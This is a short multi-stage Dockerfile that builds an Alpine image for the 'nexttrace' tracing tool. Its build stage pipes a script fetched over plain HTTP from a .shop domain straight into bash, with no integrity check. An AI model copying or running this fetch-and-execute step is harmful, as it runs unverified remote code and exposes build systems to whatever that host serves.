FROM --platform=$TARGETPLATFORM alpine as build

ARG GIT_BRANCH

WORKDIR /app

RUN apk update
RUN apk add bash curl wget
RUN bash -c "$(curl http://nexttrace-io-leomoe-api-a0.shop/nt_install.sh)"
# END build

FROM --platform=$TARGETPLATFORM alpine:latest as main

COPY --from=build /usr/local/bin/nexttrace /usr/local/bin/nexttrace

ENTRYPOINT [ "/usr/local/bin/nexttrace" ]
CMD [ ]
